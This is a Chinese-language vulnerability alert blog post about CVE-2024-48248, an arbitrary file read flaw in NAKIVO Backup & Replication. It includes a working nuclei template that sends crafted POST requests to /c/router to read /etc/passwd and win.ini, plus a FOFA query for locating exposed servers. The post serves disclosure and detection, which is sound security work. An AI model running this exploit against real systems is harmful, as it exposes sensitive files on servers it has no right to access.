#  【漏洞预警】NAKIVO Backup & Replication任意文件读取漏洞(CVE-2024-48248)   
原创 PokerSec  PokerSec   2025-02-27 05:52  
  
**先关注，不迷路**  
> 简单的生活是幸福的关键，减少欲望和复杂性。 ——《纳瓦尔宝典》  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 漏洞介绍  
  
NAKIVO Backup & Replication 是一款快速、经济实惠且一流的备份和灾难恢复解决方案，适用于 VMware vSphere、Microsoft Hyper-V、Nutanix AHV、Amazon EC2、Windows/Linux 和 Microsoft 365 环境。备份服务器可以安装在 Windows、Linux 和 NAS 操作系统上，尤其适合中小企业市场。  
NAKIVO Backup & Replication任意文件读取漏洞，攻击者可利用该漏洞获取系统敏感文件。  
## 影响范围  
  
 NAKIVO Backup & Replication < v11.0.0.88174  
## 漏洞编号  
  
CVE-2024-48248  
## 漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJEq4FKiaZYxQwYMib72MyAr2wDqeKtVqbCZ1Q9HLP9YjEFOwHBDTD2sIOt0xMuQQF0aX2EUgGrbf1Q/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJJEq4FKiaZYxQwYMib72MyAr2R6FicUV0PTHHMsegS4PNtHeeWZdMJnU7liaYDAh2baHCxEq5OXbK8S7A/640?wx_fmt=png&from=appmsg "")  
  
## 漏洞分析  
```
https://labs.watchtowr.com/the-best-security-is-when-we-all-agree-to-keep-everything-secret-except-the-secrets-nakivo-backup-replication-cve-2024-48248/
```  
## 漏洞来源  
```
https://github.com/watchtowrlabs/nakivo-arbitrary-file-read-poc-CVE-2024-48248/blob/main/README.md
```  
## nuclei脚本  
```
id: nakivo-arbitrary-CVE-2024-48248-fileread

info:
  name: nakivo-arbitrary-CVE-2024-48248-fileread
  author: PokerSec
  severity: high
  metadata:
    fofa-search: app="NAKIVO-Backup-Replication"

requests:
  - raw:
      - |-
        POST /c/router HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive
        Content-type: application/json

        {"action": "STPreLoadManagement", "data": ["/etc/passwd"], "method": "getImageByPath", "sid": "", "tid": "watchTowr", "type": "watchTowr"}
  - raw:
      - |-
        POST /c/router HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive
        Content-type: application/json

        {"action": "STPreLoadManagement", "data": ["C:/windows/win.ini"], "method": "getImageByPath", "sid": "", "tid": "watchTowr", "type": "watchTowr"}

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"type":"rpc"'
          - 'STPreLoadManagement'
          - '"data":['
        condition: and
      - type: status
        status:
          - 200
    extractors:
      - type: json 
        part: body
        name: user
        json:
          - '.data.[]'
```  
##   
## 修复意见  
  
目前官方已发布安全更新，建议用户尽快升级至最新版本：  
  
https://www.nakivo.com/resources/download/trial-download/download/  
  
  
  
如有侵权，请及时联系删除。  
  
  
